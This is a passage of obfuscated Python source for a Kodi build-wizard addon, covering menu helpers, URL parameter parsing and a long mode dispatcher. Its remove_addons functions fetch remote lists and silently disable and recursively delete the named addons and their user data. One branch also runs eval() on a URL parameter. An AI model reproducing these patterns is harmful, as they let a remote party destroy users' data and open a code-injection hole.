		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:6142
def testfirst ():#line:6144
	notify .firstRun ()#line:6145
def testfirstRun ():#line:6147
	notify .firstRunSettings ()#line:6148
def fastinstall ():#line:6151
	notify .firstRuninstall ()#line:6152
def addDir (OOOOOOO0000000OOO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6159
	O00OOOOO000OOO00O =sys .argv [0 ]#line:6160
	if not mode ==None :O00OOOOO000OOO00O +="?mode=%s"%urllib .quote_plus (mode )#line:6161
	if not name ==None :O00OOOOO000OOO00O +="&name="+urllib .quote_plus (name )#line:6162
	if not url ==None :O00OOOOO000OOO00O +="&url="+urllib .quote_plus (url )#line:6163
	O0O0O0OOO0OOOO00O =True #line:6164
	if themeit :OOOOOOO0000000OOO =themeit %OOOOOOO0000000OOO #line:6165
	O00O0000OOOO0OO00 =xbmcgui .ListItem (OOOOOOO0000000OOO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6166
	O00O0000OOOO0OO00 .setInfo (type ="Video",infoLabels ={"Title":OOOOOOO0000000OOO ,"Plot":description })#line:6167
	O00O0000OOOO0OO00 .setProperty ("Fanart_Image",fanart )#line:6168
	if not menu ==None :O00O0000OOOO0OO00 .addContextMenuItems (menu ,replaceItems =overwrite )#line:6169
	O0O0O0OOO0OOOO00O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00OOOOO000OOO00O ,listitem =O00O0000OOOO0OO00 ,isFolder =True )#line:6170
	return O0O0O0OOO0OOOO00O #line:6171
def addFile (O00O0O0O0O0OO0000 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6173
	OO0OOOO0OOOOO0OOO =sys .argv [0 ]#line:6174
	if not mode ==None :OO0OOOO0OOOOO0OOO +="?mode=%s"%urllib .quote_plus (mode )#line:6175
	if not name ==None :OO0OOOO0OOOOO0OOO +="&name="+urllib .quote_plus (name )#line:6176
	if not url ==None :OO0OOOO0OOOOO0OOO +="&url="+urllib .quote_plus (url )#line:6177
	OOOOOO00O00OOOOOO =True #line:6178
	if themeit :O00O0O0O0O0OO0000 =themeit %O00O0O0O0O0OO0000 #line:6179
	OO0O0O00O0OOOO0OO =xbmcgui .ListItem (O00O0O0O0O0OO0000 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6180
	OO0O0O00O0OOOO0OO .setInfo (type ="Video",infoLabels ={"Title":O00O0O0O0O0OO0000 ,"Plot":description })#line:6181
	OO0O0O00O0OOOO0OO .setProperty ("Fanart_Image",fanart )#line:6182
	if not menu ==None :OO0O0O00O0OOOO0OO .addContextMenuItems (menu ,replaceItems =overwrite )#line:6183
	OOOOOO00O00OOOOOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0OOOO0OOOOO0OOO ,listitem =OO0O0O00O0OOOO0OO ,isFolder =False )#line:6184
	return OOOOOO00O00OOOOOO #line:6185
def get_params ():#line:6187
	OOOOO000O0O0OOOOO =[]#line:6188
	O0OOO0OO0OOO0O0OO =sys .argv [2 ]#line:6189
	if len (O0OOO0OO0OOO0O0OO )>=2 :#line:6190
		OO0OOOOOOO0OOOOO0 =sys .argv [2 ]#line:6191
		OOO0O000O0OO00OOO =OO0OOOOOOO0OOOOO0 .replace ('?','')#line:6192
		if (OO0OOOOOOO0OOOOO0 [len (OO0OOOOOOO0OOOOO0 )-1 ]=='/'):#line:6193
			OO0OOOOOOO0OOOOO0 =OO0OOOOOOO0OOOOO0 [0 :len (OO0OOOOOOO0OOOOO0 )-2 ]#line:6194
		OO00OOO00O0OO0O0O =OOO0O000O0OO00OOO .split ('&')#line:6195
		OOOOO000O0O0OOOOO ={}#line:6196
		for O0OOO0O0OO000000O in range (len (OO00OOO00O0OO0O0O )):#line:6197
			OOOO0O0OO000O00O0 ={}#line:6198
			OOOO0O0OO000O00O0 =OO00OOO00O0OO0O0O [O0OOO0O0OO000000O ].split ('=')#line:6199
			if (len (OOOO0O0OO000O00O0 ))==2 :#line:6200
				OOOOO000O0O0OOOOO [OOOO0O0OO000O00O0 [0 ]]=OOOO0O0OO000O00O0 [1 ]#line:6201
		return OOOOO000O0O0OOOOO #line:6203
def remove_addons ():#line:6205
	try :#line:6206
			import json #line:6207
			OO00OOO00O00O0O0O =urllib2 .urlopen (remove_url ).readlines ()#line:6208
			for O0O0OOOO0OOO000O0 in OO00OOO00O00O0O0O :#line:6209
				OOOO00OOO00O0000O =O0O0OOOO0OOO000O0 .split (':')[1 ].strip ()#line:6211
				OO0O0000OO0O0OO00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OOOO00OOO00O0000O ,'false')#line:6212
				OOO0000OOOOOO0O00 =xbmc .executeJSONRPC (OO0O0000OO0O0OO00 )#line:6213
				OOO00O0000OOOOO0O =json .loads (OOO0000OOOOOO0O00 )#line:6214
				O00O0O0OOOOOO0O00 =os .path .join (addons_folder ,OOOO00OOO00O0000O )#line:6216
				if os .path .exists (O00O0O0OOOOOO0O00 ):#line:6218
					for OO0OO000OO000000O ,OOOO00OO00O00OOO0 ,O0OOOOO000OO0OOOO in os .walk (O00O0O0OOOOOO0O00 ):#line:6219
						for O00OO00000O0O0OO0 in O0OOOOO000OO0OOOO :#line:6220
							os .unlink (os .path .join (OO0OO000OO000000O ,O00OO00000O0O0OO0 ))#line:6221
						for O000O00O00OO00000 in OOOO00OO00O00OOO0 :#line:6222
							shutil .rmtree (os .path .join (OO0OO000OO000000O ,O000O00O00OO00000 ))#line:6223
					os .rmdir (O00O0O0OOOOOO0O00 )#line:6224
			xbmc .executebuiltin ('Container.Refresh')#line:6226
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:6227
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:6228
	except :pass #line:6229
def remove_addons2 ():#line:6230
	try :#line:6231
			import json #line:6232
			OOO000O0000000OOO =urllib2 .urlopen (remove_url2 ).readlines ()#line:6233
			for OO000OO0OO0OO000O in OOO000O0000000OOO :#line:6234
				OOO0OOOO0O0000000 =OO000OO0OO0OO000O .split (':')[1 ].strip ()#line:6236
				OO0OOOOO00O0OO00O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OOO0OOOO0O0000000 ,'false')#line:6237
				O0O0OOO0O000O0000 =xbmc .executeJSONRPC (OO0OOOOO00O0OO00O )#line:6238
				OO0OOOO00OO0OOO0O =json .loads (O0O0OOO0O000O0000 )#line:6239
				O0OO00OOO00O000OO =os .path .join (user_folder ,OOO0OOOO0O0000000 )#line:6241
				if os .path .exists (O0OO00OOO00O000OO ):#line:6243
					for OO0O00OOOO00O0OOO ,O0O0O00OO0OOO0OOO ,O000O000OOOOO0OO0 in os .walk (O0OO00OOO00O000OO ):#line:6244
						for OO00OOOOO00000O00 in O000O000OOOOO0OO0 :#line:6245
							os .unlink (os .path .join (OO0O00OOOO00O0OOO ,OO00OOOOO00000O00 ))#line:6246
						for O0000000O0OO0O0OO in O0O0O00OO0OOO0OOO :#line:6247
							shutil .rmtree (os .path .join (OO0O00OOOO00O0OOO ,O0000000O0OO0O0OO ))#line:6248
					os .rmdir (O0OO00OOO00O000OO )#line:6249
	except :pass #line:6251
params =get_params ()#line:6252
url =None #line:6253
name =None #line:6254
mode =None #line:6255
try :mode =urllib .unquote_plus (params ["mode"])#line:6257
except :pass #line:6258
try :name =urllib .unquote_plus (params ["name"])#line:6259
except :pass #line:6260
try :url =urllib .unquote_plus (params ["url"])#line:6261
except :pass #line:6262
def setView (OO0O0OOOO0O00O0OO ,OO00O00OOO0O00OO0 ):#line:6266
	if wiz .getS ('auto-view')=='true':#line:6267
		OOOO0OO0O000OO000 =wiz .getS (OO00O00OOO0O00OO0 )#line:6268
		if OOOO0OO0O000OO000 =='50'and KODIV >=17 and SKIN =='skin.estuary':OOOO0OO0O000OO000 ='55'#line:6269
		if OOOO0OO0O000OO000 =='500'and KODIV >=17 and SKIN =='skin.estuary':OOOO0OO0O000OO000 ='50'#line:6270
		wiz .ebi ("Container.SetViewMode(%s)"%OOOO0OO0O000OO000 )#line:6271
if mode ==None :index ()#line:6273
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:6275
elif mode =='builds':buildMenu ()#line:6276
elif mode =='viewbuild':viewBuild (name )#line:6277
elif mode =='buildinfo':buildInfo (name )#line:6278
elif mode =='buildpreview':buildVideo (name )#line:6279
elif mode =='install':buildWizard (name ,url )#line:6280
elif mode =='theme':buildWizard (name ,mode ,url )#line:6281
elif mode =='viewthirdparty':viewThirdList (name )#line:6282
elif mode =='installthird':thirdPartyInstall (name ,url )#line:6283
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:6284
elif mode =='maint':maintMenu (name )#line:6286
elif mode =='passpin':passandpin ()#line:6287
elif mode =='backmyupbuild':backmyupbuild ()#line:6288
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:6289
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:6290
elif mode =='advancedsetting':advancedWindow (name )#line:6291
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:6292
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:6293
elif mode =='asciicheck':wiz .asciiCheck ()#line:6294
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:6295
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:6296
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:6297
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:6298
elif mode =='oldThumbs':wiz .oldThumbs ()#line:6299
elif mode =='clearbackup':wiz .cleanupBackup ()#line:6300
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:6301
elif mode =='currentsettings':viewAdvanced ()#line:6302
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:6303
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:6304
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:6305
elif mode =='fixskin':backtokodi ()#line:6306
elif mode =='testcommand':updatetelemedia (NOTEID )#line:6307
elif mode =='logsend':logsend ()#line:6308
elif mode =='rdon':rdon ()#line:6309
elif mode =='rdoff':rdoff ()#line:6310
elif mode =='setrd':setrealdebrid ()#line:6311
elif mode =='setrd2':setautorealdebrid ()#line:6312
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:6313
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:6314
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:6315
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:6316
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:6317
elif mode =='freshstart':freshStart ()#line:6318
elif mode =='forceupdate':wiz .forceUpdate ()#line:6319
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:6320
elif mode =='forceclose':wiz .killxbmc ()#line:6321
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:6322
elif mode =='hidepassword':wiz .hidePassword ()#line:6323
elif mode =='unhidepassword':wiz .unhidePassword ()#line:6324
elif mode =='enableaddons':enableAddons ()#line:6325
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:6326
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:6327
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:6328
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:6329
elif mode =='uploadlog':uploadLog .Main ()#line:6330
elif mode =='viewlog':LogViewer ()#line:6331
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:6332
elif mode =='viewerrorlog':errorChecking (all =True )#line:6333
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:6334
elif mode =='purgedb':purgeDb ()#line:6335
elif mode =='fixaddonupdate':fixUpdate ()#line:6336
elif mode =='removeaddons':removeAddonMenu ()#line:6337
elif mode =='removeaddon':removeAddon (name )#line:6338
elif mode =='removeaddondata':removeAddonDataMenu ()#line:6339
elif mode =='removedata':removeAddonData (name )#line:6340
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:6341
elif mode =='systeminfo':systemInfo ()#line:6342
elif mode =='restorezip':restoreit ('build')#line:6343
elif mode =='restoregui':restoreit ('gui')#line:6344
elif mode =='restoreaddon':restoreit ('addondata')#line:6345
elif mode =='restoreextzip':restoreextit ('build')#line:6346
elif mode =='restoreextgui':restoreextit ('gui')#line:6347
elif mode =='restoreextaddon':restoreextit ('addondata')#line:6348
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:6349
elif mode =='traktsync':traktsync ()#line:6350
elif mode =='apk':apkMenu (name )#line:6352
elif mode =='apkscrape':apkScraper (name )#line:6353
elif mode =='apkinstall':apkInstaller (name ,url )#line:6354
elif mode =='speed':speedMenu ()#line:6355
elif mode =='net':net_tools ()#line:6356
elif mode =='GetList':GetList (url )#line:6357
elif mode =='youtube':youtubeMenu (name )#line:6358
elif mode =='viewVideo':playVideo (url )#line:6359
elif mode =='addons':addonMenu (name )#line:6361
elif mode =='addoninstall':addonInstaller (name ,url )#line:6362
elif mode =='savedata':saveMenu ()#line:6364
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:6365
elif mode =='managedata':manageSaveData (name )#line:6366
elif mode =='whitelist':wiz .whiteList (name )#line:6367
elif mode =='trakt':traktMenu ()#line:6369
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:6370
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:6371
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:6372
elif mode =='cleartrakt':traktit .clearSaved (name )#line:6373
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:6374
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:6375
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:6376
elif mode =='realdebrid':realMenu ()#line:6378
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:6379
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:6380
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:6381
elif mode =='cleardebrid':debridit .clearSaved (name )#line:6382
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:6383
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:6384
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:6385
elif mode =='login':loginMenu ()#line:6387
elif mode =='savelogin':loginit .loginIt ('update',name )#line:6388
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:6389
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:6390
elif mode =='clearlogin':loginit .clearSaved (name )#line:6391
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:6392
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:6393
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:6394
elif mode =='contact':notify .contact (CONTACT )#line:6396
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:6397
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:6398
elif mode =='developer':developer ()#line:6400
elif mode =='converttext':wiz .convertText ()#line:6401
elif mode =='createqr':wiz .createQR ()#line:6402
elif mode =='testnotify':testnotify ()#line:6403
elif mode =='testnotify2':testnotify2 ()#line:6404
elif mode =='servicemanual':servicemanual ()#line:6405
elif mode =='fastinstall':fastinstall ()#line:6406
elif mode =='testupdate':testupdate ()#line:6407
elif mode =='testfirst':testfirst ()#line:6408
elif mode =='testfirstrun':testfirstRun ()#line:6409
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:6410
elif mode =='bg':wiz .bg_install (name ,url )#line:6412
elif mode =='bgcustom':wiz .bg_custom ()#line:6413
elif mode =='bgremove':wiz .bg_remove ()#line:6414
elif mode =='bgdefault':wiz .bg_default ()#line:6415
elif mode =='rdset':rdsetup ()#line:6416
elif mode =='mor':morsetup ()#line:6417
elif mode =='mor2':morsetup2 ()#line:6418
elif mode =='resolveurl':resolveurlsetup ()#line:6419
elif mode =='urlresolver':urlresolversetup ()#line:6420
elif mode =='forcefastupdate':forcefastupdate ()#line:6421
elif mode =='traktset':traktsetup ()#line:6422
elif mode =='placentaset':placentasetup ()#line:6423
elif mode =='flixnetset':flixnetsetup ()#line:6424
elif mode =='reptiliaset':reptiliasetup ()#line:6425
elif mode =='yodasset':yodasetup ()#line:6426
elif mode =='numbersset':numberssetup ()#line:6427
elif mode =='uranusset':uranussetup ()#line:6428
elif mode =='genesisset':genesissetup ()#line:6429
elif mode =='fastupdate':fastupdate ()#line:6430
elif mode =='folderback':folderback ()#line:6431
elif mode =='menudata':Menu ()#line:6432
elif mode =='infoupdate':infobuild ()#line:6433
elif mode =='wait':wait ()#line:6434
elif mode ==2 :#line:6435
        wiz .torent_menu ()#line:6436
elif mode ==3 :#line:6437
        wiz .popcorn_menu ()#line:6438
elif mode ==8 :#line:6439
        wiz .metaliq_fix ()#line:6440
elif mode ==9 :#line:6441
        wiz .quasar_menu ()#line:6442
elif mode ==5 :#line:6443
        swapSkins ('skin.Premium.mod')#line:6444
elif mode ==13 :#line:6445
        wiz .elementum_menu ()#line:6446
elif mode ==16 :#line:6447
        wiz .fix_wizard ()#line:6448
elif mode ==17 :#line:6449
        wiz .last_play ()#line:6450
elif mode ==18 :#line:6451
        wiz .normal_metalliq ()#line:6452
elif mode ==19 :#line:6453
        wiz .fast_metalliq ()#line:6454
elif mode ==20 :#line:6455
        wiz .fix_buffer2 ()#line:6456
elif mode ==21 :#line:6457
        wiz .fix_buffer3 ()#line:6458
elif mode ==11 :#line:6459
        wiz .fix_buffer ()#line:6460
elif mode ==15 :#line:6461
        wiz .fix_font ()#line:6462
elif mode ==14 :#line:6463
        wiz .clean_pass ()#line:6464
elif mode ==22 :#line:6465
        wiz .movie_update ()#line:6466
elif mode =='simpleiptv':#line:6469
    DIALOG =xbmcgui .Dialog ()#line:6471
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את חשבון ה IPTV?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6472
    if choice ==1 :#line:6473
        iptvkodi17_18 ()#line:6474
    else :#line:6476
     sys .exit ()#line:6477
elif mode =='simpleidanplus':#line:6479
    DIALOG =xbmcgui .Dialog ()#line:6480
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את ערוצי עידן פלוס בטלוויזיה חיה? שימו לב זה ימחק לכם את מנוי ה IPTV שלכם",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6481
    if choice ==1 :#line:6482
        iptvidanplus ()#line:6483
    else :#line:6485
     sys .exit ()#line:6486
elif mode =='update_tele':updatetelemedia (NOTEID )#line:6488
elif mode =='adv_settings':buffer1 ()#line:6489
elif mode =='getpass':getpass ()#line:6490
elif mode =='setpass':setpass ()#line:6491
elif mode =='setuname':setuname ()#line:6492
elif mode =='passandUsername':passandUsername ()#line:6493
elif mode =='9':disply_hwr ()#line:6494
elif mode =='99':disply_hwr2 ()#line:6495
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))